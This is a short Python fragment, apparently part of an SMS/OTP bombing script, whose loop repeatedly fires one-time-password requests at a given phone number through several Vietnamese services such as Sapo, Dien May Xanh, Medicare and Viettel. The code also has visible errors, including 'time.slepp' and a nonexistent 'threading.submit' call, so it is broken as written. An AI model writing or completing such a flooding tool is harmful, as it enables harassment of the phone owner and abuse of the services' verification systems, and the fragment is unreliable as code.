...
def mainn(phone,amount):
  for i in range(amount):
    # mau
    threading.submit(send_otp_via_sapo,phone)
    threading.submit(send_otp_via_dienmayxanh,phone)
    time.slepp(1)
    threading.submit(send_otp_via_medicare,phone)
    threading.submit(send_otp_via_viettel,phone)
    time.sleep(1)
